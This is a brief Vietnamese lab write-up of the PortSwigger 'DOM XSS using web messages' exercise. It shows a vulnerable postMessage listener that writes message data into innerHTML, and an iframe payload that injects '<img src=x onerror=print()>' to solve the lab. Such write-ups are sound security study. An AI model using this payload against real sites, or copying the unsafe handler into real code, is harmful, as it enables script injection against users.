## DOM XSS using web messages

> Lab này sẽ hướng dẫn chúng ta postMessage tới target exploit bằng bằng cách gọi hàm print() để solve lab

![](/imgs/DOM-BASED-VULNERABILITIES/1.png?raw=true)

Vì thế ta sẽ sử dụng postMessage để send request đi tới địa chỉ của lab.

Nếu check source ta sẽ thấy function **addEventListener** dùng để lắng nghe message.

```javascript
<script>
window.addEventListener('message', function(e) {
document.getElementById('ads').innerHTML = e.data; })
</script>
```

Ở đây message sẽ là error để gọi function print, iframe sẽ trỏ tới địa chỉ lab.

```html
<iframe src="https://ac351fcd1f9b878680381a3b000f0042.web-security-academy.net/” onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')">
```
![](/imgs/DOM-BASED-VULNERABILITIES/2.png?raw=true)

### Tài liệu tham khảo
- DOM-based Vuln: [https://portswigger.net/web-security/dom-based](https://portswigger.net/web-security/dom-based)
- PostMesage to Iframe: [https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)